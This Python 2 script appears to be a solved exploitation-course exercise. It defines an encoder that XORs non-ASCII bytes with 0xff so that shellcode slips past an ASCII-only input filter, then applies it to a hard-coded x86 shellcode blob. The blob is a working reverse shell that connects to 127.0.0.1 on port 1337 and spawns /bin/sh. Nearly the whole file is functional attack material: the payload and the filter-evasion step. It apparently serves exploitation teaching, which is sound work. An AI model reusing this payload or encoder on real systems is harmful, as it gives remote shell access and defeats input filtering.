import functools, os, socket, traceback, struct


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


ASCII_MAX = 0x7f


def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)
    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(ord(c) > ASCII_MAX for c in selector(ret)):
                print('WARNING: Non ASCII chars in return value from %s at\n%s'
                      % (func.__name__, ''.join(traceback.format_stack()[:-1])))
            return ret
        return result
    return decorator

def encode(data):
    '''Encode data to be valid ASCII, by XOR-ing non ASCII bytes with 0xff.

    Return the encoded data and the indices that were XOR-ed.
    - To return multiple values, do `return a, b`
    - To get multiple returned values do `a, b = encode(data)`
    '''
    # TODO: IMPLEMENT THIS FUNCTION
    xor_indces = []
    new_shellcode = ""
    ascii_xor = 0xff
    for i in range(len(data)):
        code_byte = struct.unpack("B", data[i])[0] # convert to unsigned byte numeric type
        if code_byte > ASCII_MAX:
            code_byte ^= ascii_xor # xor with 0xff
            code_byte = struct.pack("B", code_byte) # pack again to unsigned byte
            new_shellcode += code_byte # append to new shellcode
            xor_indces.append(i) # mark index that was xor'ed
        else:
            new_shellcode += data[i] # else, don't change index

    return new_shellcode, xor_indces

old_shellcode = 'U\x89\xe5\x83\xec$\xc7E\xe4\x00\x00\x00\x00\xc7E\xe8\x00\x00\x00\x00\xc7E\xec\x00\x00\x00\x00\xc7E\xf0\x00\x00\x00\x00\x83\xec\x04j\x00j\x01j\x02\xba0\x87\x04\x08\xff\xd2\x83\xc4\x10\x89E\xf4f\xc7E\xe4\x02\x00\x83\xec\x0ch9\x05\x00\x00\xba@\x86\x04\x08\xff\xd2\x83\xc4\x10f\x89E\xe6\x83\xec\x0c\xebp\xba@\x87\x04\x08\xff\xd2\x83\xc4\x10\x89E\xe8\x83\xec\x04j\x10\x8dE\xe4P\xffu\xf4\xbaP\x87\x04\x08\xff\xd2\x83\xc4\x10\x83\xec\x08j\x00\xffu\xf4\xba\x00\x86\x04\x08\xff\xd2\x83\xc4\x10\x83\xec\x08j\x01\xffu\xf4\xba\x00\x86\x04\x08\xff\xd2\x83\xc4\x10\x83\xec\x08j\x02\xffu\xf4\xba\x00\x86\x04\x08\xff\xd2\x83\xc4\x10\xc7E\xe0\x00\x00\x00\x00\x83\xec\x08\x8dE\xe0P\xeb\x16\xba\xd0\x86\x04\x08\xff\xd2\xe8\x8b\xff\xff\xff127.0.0.1\x00\xe8\xe5\xff\xff\xff/bin/sh\x00'

shell, arr = encode(old_shellcode)
print shell
print arr
